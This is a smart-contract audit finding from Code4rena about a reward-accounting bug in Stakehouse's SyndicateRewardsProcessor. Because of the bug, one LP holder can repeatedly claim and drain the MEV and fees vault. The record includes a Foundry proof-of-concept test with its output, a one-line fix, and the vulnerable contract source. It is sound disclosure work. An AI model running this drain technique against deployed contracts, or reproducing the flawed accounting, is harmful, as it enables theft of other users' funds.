{
  "Title": "[H-09] Incorrect accounting in SyndicateRewardsProcessor results in any LP token holder being able to steal other LP tokens holder’s ETH from the fees and MEV vault",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88\n\n\n# Vulnerability details\n\n## Impact\nThe SyndicateRewardsProcessor's internal `_distributeETHRewardsToUserForToken()` function is called from external `claimRewards()` function in the `StakingFundsVault` contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.\nThe accumulated rewards `due` are calculated as `((accumulatedETHPerLPShare * balance) / PRECISION)` reduced by the previous claimed amount stored in `claimed[_user][_token]`. When the ETH is sent to the `_user` the stored value should be increased by the `due` amount. However in the current code base the `claimed[_user][_token]` is set equal to the calculated `due`.\n\n```solidity\nfunction _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n                totalClaimed += due;\n                (bool success, ) = _recipient.call{value: due}(\"\");\n\t\t\t\t...\n\t\t\t}\n        }\n    }\n```\n\nThis means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the `claimed[_user][_token]`.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.\n\n## Proof of Concept\nFollowing modification to the existing `StakingFundsVault.t.sol` will provide a test to demonstrate the issue:\n```diff\ndiff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol\nindex 53b4ce0..4db8fc8 100644\n--- a/test/foundry/StakingFundsVault.t.sol\n+++ b/test/foundry/StakingFundsVault.t.sol\n@@ -4,6 +4,7 @@ import \"forge-std/console.sol\";\n \n import { StakingFundsVault } from \"../../contracts/liquid-staking/StakingFundsVault.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { SyndicateRewardsProcessor} from \"../../contracts/liquid-staking/SyndicateRewardsProcessor.sol\";\n import {\n     TestUtils,\n     MockLSDNFactory,\n@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {\n         assertEq(vault.totalClaimed(), rewardsAmount);\n         assertEq(vault.totalRewardsReceived(), rewardsAmount);\n     }\n+\n+    function testRepetitiveClaim() public {\n+        // register BLS key with the network\n+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);\n+\n+        vm.label(accountOne, \"accountOne\");\n+        vm.label(accountTwo, \"accountTwo\");\n+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool\n+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+\n+        // Do a deposit of 24 ETH for savETH pool\n+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);\n+\n+        stakeAndMintDerivativesSingleKey(blsPubKeyFour);\n+\n+        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Deal ETH to the staking funds vault\n+        uint256 rewardsAmount = 1.2 ether;\n+        console.log(\"depositing %s wei into the vault.\\n\", rewardsAmount);\n+        vm.deal(address(vault), rewardsAmount);\n+        assertEq(address(vault).balance, rewardsAmount);\n+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"depositing %s wei into the vault.\\n\", rewardsAmount);\n+        vm.deal(address(vault), address(vault).balance + rewardsAmount);\n+        vm.warp(block.timestamp + 3 hours);\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        //console.log(\"Claiming rewards for accountTwo.\\n\");\n+        vm.prank(accountTwo);\n+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));\n+\n+    }\n+\n+    function logAccounts() internal {\n+        console.log(\"accountOne previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountOne claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"accountTwo previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountTwo claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\\n\", accountOne.balance, accountTwo.balance, address(vault).balance);\n+    }\n+\n }\n\n```\n\nNote that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.\n\nFollowing is an output of the test script showing the balances and differnet state variables:\n```\nforge test -vv --match testRepetitiveClaim\n[⠑] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\n[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\nLogs:\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 0\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 0\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0\n\n\nTest result: FAILED. 0 passed; 1 failed; finished in 15.64ms\n\nFailing tests:\nEncountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\n[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\n```\n\n## Tools Used\nManual review / forge test\n\n## Recommended Mitigation Steps\n\nThe `SyndicateRewardsProcessor` contract should be modified as follows:\n```diff\ndiff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\nindex 81be706..9b9c502 100644\n--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {\n             // Calculate how much ETH rewards the address is owed / due \n             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n             if (due > 0) {\n-                claimed[_user][_token] = due;\n+                claimed[_user][_token] += due;\n \n                 totalClaimed += due;\n \n\n```",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
  "Code": [
    {
      "filename": "contracts/liquid-staking/SyndicateRewardsProcessor.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\n/// @notice Allows a contract to receive rewards from a syndicate and distribute it amongst LP holders\nabstract contract SyndicateRewardsProcessor {\n\n    /// @notice Emitted when ETH is received by the contract and processed\n    event ETHReceived(uint256 amount);\n\n    /// @notice Emitted when ETH from syndicate is distributed to a user\n    event ETHDistributed(address indexed user, address indexed recipient, uint256 amount);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accumulated ETH per share of LP<>KNOT that has minted derivatives scaled to 'PRECISION'\n    uint256 public accumulatedETHPerLPShare;\n\n    /// @notice Total ETH claimed by all users of the contract\n    uint256 public totalClaimed;\n\n    /// @notice Last total rewards seen by the contract\n    uint256 public totalETHSeen;\n\n    /// @notice Total ETH claimed by a given address for a given token\n    mapping(address => mapping(address => uint256)) public claimed;\n\n    /// @dev Internal logic for previewing accumulated ETH for an LP user\n    function _previewAccumulatedETH(\n        address _sender,\n        address _token,\n        uint256 _balanceOfSender,\n        uint256 _numOfShares,\n        uint256 _unclaimedETHFromSyndicate\n    ) internal view returns (uint256) {\n        if (_balanceOfSender > 0) {\n            uint256 claim = claimed[_sender][_token];\n\n            uint256 received = totalRewardsReceived() + _unclaimedETHFromSyndicate;\n            uint256 unprocessed = received - totalETHSeen;\n\n            uint256 newAccumulatedETH = accumulatedETHPerLPShare + ((unprocessed * PRECISION) / _numOfShares);\n\n            return ((newAccumulatedETH * _balanceOfSender) / PRECISION) - claim;\n        }\n        return 0;\n    }\n\n    /// @dev Any due rewards from node running can be distributed to msg.sender if they have an LP balance\n    function _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n\n                totalClaimed += due;\n\n                (bool success, ) = _recipient.call{value: due}(\"\");\n                require(success, \"Failed to transfer\");\n\n                emit ETHDistributed(_user, _recipient, due);\n            }\n        }\n    }\n\n    /// @dev Internal logic for tracking accumulated ETH per share\n    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n        if (_numOfShares > 0) {\n            uint256 received = totalRewardsReceived();\n            uint256 unprocessed = received - totalETHSeen;\n\n            if (unprocessed > 0) {\n                emit ETHReceived(unprocessed);\n\n                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n                totalETHSeen = received;\n            }\n        }\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate\n    function totalRewardsReceived() public virtual view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @notice Allow the contract to receive ETH\n    receive() external payable {}\n}"
    },
    {
      "filename": "contracts/liquid-staking/StakingFundsVault.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { ETHPoolLPFactory } from \"./ETHPoolLPFactory.sol\";\nimport { LiquidStakingManager } from \"./LiquidStakingManager.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\n\n/// @title MEV and fees vault for a specified liquid staking network\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, SyndicateRewardsProcessor, ReentrancyGuard\n{\n\n    /// @notice signalize that the vault received ETH\n    event ETHDeposited(address sender, uint256 amount);\n\n    /// @notice signalize ETH withdrawal from the vault\n    event ETHWithdrawn(address receiver, address admin, uint256 amount);\n\n    /// @notice signalize ERC20 token recovery by the admin\n    event ERC20Recovered(address admin, address recipient, uint256 amount);\n\n    /// @notice signalize unwrapping of WETH in the vault\n    event WETHUnwrapped(address admin, uint256 amount);\n\n    /// @notice Address of the network manager\n    LiquidStakingManager public liquidStakingNetworkManager;\n\n    /// @notice Total number of LP tokens issued in WEI\n    uint256 public totalShares;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _liquidStakingNetworkManager address of the liquid staking network manager\n    function init(address _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) external virtual initializer {\n        _init(LiquidStakingManager(payable(_liquidStakingNetworkManager)), _lpTokenFactory);\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == address(liquidStakingNetworkManager), \"Only network manager\");\n        _;\n    }\n\n    /// @notice Allows the liquid staking manager to notify funds vault about new derivatives minted to enable MEV claiming\n    function updateDerivativesMinted() external onlyManager {\n        // We know 4 ETH for the KNOT came from this vault so increase the shares to get a % of vault rewards\n        totalShares += 4 ether;\n    }\n\n    /// @notice For knots that have minted derivatives, update accumulated ETH per LP\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(totalShares);\n    }\n\n    /// @notice Batch deposit ETH for staking against multiple BLS public keys\n    /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n    /// @param _amounts Amounts of ETH being staked for each BLS public key\n    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"Empty arrays\");\n        require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        uint256 totalAmount;\n        for (uint256 i; i < numOfValidators; ++i) {\n            require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is not part of LSD network\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n\n            LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            if (address(tokenForKnot) != address(0)) {\n                // Give anything owed to the user before making updates to user state\n                _distributeETHRewardsToUserForToken(\n                    msg.sender,\n                    address(tokenForKnot),\n                    tokenForKnot.balanceOf(msg.sender),\n                    msg.sender\n                );\n            }\n\n            uint256 amount = _amounts[i];\n            totalAmount += amount;\n\n            _depositETHForStaking(_blsPublicKeyOfKnots[i], amount, true);\n\n            // Ensure user cannot get historical rewards\n            tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n        }\n\n        // Ensure that the sum of LP tokens issued equals the ETH deposited into the contract\n        require(msg.value == totalAmount, \"Invalid ETH amount attached\");\n    }\n\n    /// @notice Deposit ETH against a BLS public key for staking\n    /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n    /// @param _amount Amount of ETH being staked\n    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n        require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(msg.value == _amount, \"Must provide correct amount of ETH\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        // Give anything owed to the user before making updates to user state\n        LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if (address(tokenForKnot) != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                msg.sender,\n                address(tokenForKnot),\n                tokenForKnot.balanceOf(msg.sender),\n                msg.sender\n            );\n        }\n\n        _depositETHForStaking(_blsPublicKeyOfKnot, _amount, true);\n\n        // Ensure user cannot get historical rewards\n        tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n\n        return _amount;\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked by BLS public key\n    /// @param _blsPublicKeys List of BLS public keys that received ETH for staking\n    /// @param _amounts List of amounts of LP tokens being burnt\n    function burnLPTokensForETHByBLS(bytes[] calldata _blsPublicKeys, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _blsPublicKeys.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            LPToken token = lpTokenForKnot[_blsPublicKeys[i]];\n            require(address(token) != address(0), \"No ETH staked for specified BLS key\");\n            burnLPForETH(token, _amounts[i]);\n        }\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked\n    /// @param _lpTokens Address of LP tokens being burnt\n    /// @param _amounts Amount of LP tokens being burnt\n    function burnLPTokensForETH(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _lpTokens.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            burnLPForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice For a user that has deposited ETH that has not been staked, allow them to burn LP to get ETH back\n    /// @param _lpToken Address of the LP token being burnt\n    /// @param _amount Amount of LP token being burnt\n    function burnLPForETH(LPToken _lpToken, uint256 _amount) public nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _lpToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(address(_lpToken) != address(0), \"Zero address specified\");\n\n        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Cannot burn LP tokens\"\n        );\n        require(_lpToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Too new\");\n\n        updateAccumulatedETHPerLP();\n\n        _lpToken.burn(msg.sender, _amount);\n\n        (bool result,) = msg.sender.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n        emit ETHWithdrawnByDepositor(msg.sender, _amount);\n\n        emit LPTokenBurnt(blsPublicKeyOfKnot, address(_lpToken), msg.sender, _amount);\n    }\n\n    /// @notice Any LP tokens for BLS keys that have had their derivatives minted can claim ETH from the syndicate contract\n    /// @param _blsPubKeys List of BLS public keys being processed\n    function claimRewards(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\n    /// @notice function to allow admins to withdraw ETH from the vault for staking purpose\n    /// @param _wallet address of the smart wallet that receives ETH\n    /// @param _amount number of ETH withdrawn\n    /// @return number of ETH withdrawn\n    function withdrawETH(address _wallet, uint256 _amount) public onlyManager nonReentrant returns (uint256) {\n        require(_amount >= 4 ether, \"Amount cannot be less than 4 ether\");\n        require(_amount <= address(this).balance, \"Not enough ETH to withdraw\");\n        require(_wallet != address(0), \"Zero address\");\n\n        (bool result,) = _wallet.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n\n        emit ETHWithdrawn(_wallet, msg.sender, _amount);\n\n        return _amount;\n    }\n\n    /// @notice For any knots that are no longer part of syndicate facilitate unstaking so that knot can rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function unstakeSyndicateSharesForRageQuit(\n        address _sETHRecipient,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyManager nonReentrant {\n        Syndicate syndicate = Syndicate(payable(liquidStakingNetworkManager.syndicate()));\n\n        _claimFundsFromSyndicateForDistribution(address(syndicate), _blsPublicKeys);\n\n        updateAccumulatedETHPerLP();\n\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            require(syndicate.isNoLongerPartOfSyndicate(_blsPublicKeys[i]), \"Knot is still active in syndicate\");\n        }\n\n        syndicate.unstake(address(this), _sETHRecipient, _blsPublicKeys, _amounts);\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETHByBLSKeys(address _user, bytes[] calldata _blsPubKeys) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            totalAccumulated += previewAccumulatedETH(_user, token);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETH(address _user, LPToken[] calldata _token) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _token.length; ++i) {\n            totalAccumulated += previewAccumulatedETH(_user, _token[i]);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with a KNOT that has minted derivatives\n    function previewAccumulatedETH(address _user, LPToken _token) public view returns (uint256) {\n        // if token maps to BLS public key that has not been minted derivatives then return zero as it's not eligible\n        bytes memory associatedBLSPublicKeyOfLpToken = KnotAssociatedWithLPToken[_token];\n        if (getAccountManager().blsPublicKeyToLifecycleStatus(associatedBLSPublicKeyOfLpToken) != IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n            return 0;\n        }\n\n        // Looking at this contract balance and the ETH that is yet to be transferred from the syndicate, then tell the user how much ETH they have earned\n        address payable syndicate = payable(liquidStakingNetworkManager.syndicate());\n        return _previewAccumulatedETH(\n            _user,\n            address(_token),\n            _token.balanceOf(_user),\n            totalShares,\n            Syndicate(syndicate).previewUnclaimedETHAsFreeFloatingStaker(\n                address(this),\n                associatedBLSPublicKeyOfLpToken\n            )\n        );\n    }\n\n    /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n        address syndicate = liquidStakingNetworkManager.syndicate();\n        if (syndicate != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            bytes memory blsPubKey = KnotAssociatedWithLPToken[token];\n            require(blsPubKey.length > 0, \"Invalid token\");\n\n            if (getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n                // Claim any ETH for the BLS key mapped to this token\n                bytes[] memory keys = new bytes[](1);\n                keys[0] = blsPubKey;\n                _claimFundsFromSyndicateForDistribution(syndicate, keys);\n\n                // Update the accumulated ETH per minted derivative LP share\n                updateAccumulatedETHPerLP();\n\n                // distribute any due rewards for the `from` user\n                if (_from != address(0)) {\n                    _distributeETHRewardsToUserForToken(_from, address(token), token.balanceOf(_from), _from);\n                }\n\n                // in case the new user has existing rewards - give it to them so that the after transfer hook does not wipe pending rewards\n                _distributeETHRewardsToUserForToken(_to, address(token), token.balanceOf(_to), _to);\n            }\n        }\n    }\n\n    /// @notice After an LP token is transferred, ensure that the new account cannot claim historical rewards\n    function afterTokenTransfer(address, address _to, uint256) external override {\n        if (LiquidStakingManager(payable(liquidStakingNetworkManager)).syndicate() != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            require(KnotAssociatedWithLPToken[token].length > 0, \"Invalid token\");\n\n            // claim is calculated on full balance not amount being transferred so that double claims are not possible\n            claimed[_to][address(token)] = (token.balanceOf(_to) * accumulatedETHPerLPShare) / PRECISION;\n        }\n    }\n\n    /// @notice Claim ETH to this contract from the syndicate that was accrued by a list of actively staked validators\n    /// @param _blsPubKeys List of BLS public key identifiers of validators that have sETH staked in the syndicate for the vault\n    function claimFundsFromSyndicateForDistribution(bytes[] memory _blsPubKeys) external {\n        _claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(), _blsPubKeys);\n    }\n\n    /// @dev Claim ETH from syndicate for a list of BLS public keys for later distribution amongst LPs\n    function _claimFundsFromSyndicateForDistribution(address _syndicate, bytes[] memory _blsPubKeys) internal {\n        require(_syndicate != address(0), \"Invalid configuration\");\n\n        // Claim all of the ETH due from the syndicate for the auto-staked sETH\n        Syndicate syndicateContract = Syndicate(payable(_syndicate));\n        syndicateContract.claimAsStaker(address(this), _blsPubKeys);\n\n        updateAccumulatedETHPerLP();\n    }\n\n    /// @dev Initialization logic\n    function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {\n        require(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");\n        require(address(_lpTokenFactory) != address(0), \"Zero Address\");\n\n        liquidStakingNetworkManager = _liquidStakingNetworkManager;\n        lpTokenFactory = _lpTokenFactory;\n\n        baseLPTokenName = \"ETHLPToken_\";\n        baseLPTokenSymbol = \"ETHLP_\";\n        maxStakingAmountPerValidator = 4 ether;\n    }\n}"
    }
  ]
}